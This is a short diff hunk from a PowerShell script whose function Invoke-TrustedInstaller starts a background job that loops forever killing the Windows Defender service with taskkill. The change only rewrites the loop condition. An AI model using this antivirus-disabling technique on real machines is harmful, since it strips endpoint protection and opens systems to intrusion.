@@ -25,7 +25,7 @@ function Invoke-TrustedInstaller {
     # Start a background job consisting of an infinite loop that keeps killing the Windows Defender service
     # you need TI privileges to do this
     Start-Job -ScriptBlock {
-        while (1) {
+        while ($true) {
             cmd.exe /c "taskkill /f /im MsMpSvc.exe"
         }
     }
